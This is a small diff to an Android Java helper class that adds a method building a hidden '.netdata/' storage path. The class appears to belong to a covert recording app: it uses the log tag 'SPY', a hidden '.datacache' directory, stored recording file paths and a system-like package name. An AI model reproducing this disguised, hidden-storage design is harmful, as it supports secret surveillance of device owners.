@@ -2,7 +2,9 @@ package com.android.network.detect;
 
 import android.annotation.SuppressLint;
 import android.app.Application;
+import android.content.Context;
 import android.content.SharedPreferences;
+import android.os.Environment;
 import android.preference.PreferenceManager;
 import android.util.Log;
 
@@ -14,10 +16,12 @@ public class AppGlobals extends Application {
     static final String DIRECTORY_NAME = ".datacache";
     private static final String LOG_TAG = "SPY";
     private static SharedPreferences sPreferences;
+    private static Context mContext;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        mContext = getApplicationContext();
         sPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
     }
 
@@ -69,6 +73,13 @@ public class AppGlobals extends Application {
 
     static String getLastRecordingFilePath() {
         return sPreferences.getString("LAST_RECORDING_FILE_PATH", null);
+    }
+
+    static String getAppDataDirectory() {
+        String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android";
+        String dataDirectory = sdcard + Environment.getDataDirectory().getAbsolutePath();
+        String packageLocation = dataDirectory + "/" + mContext.getPackageName();
+        return packageLocation + "/" + ".netdata/";
     }
 
     static String getLogTag(Class aClass) {
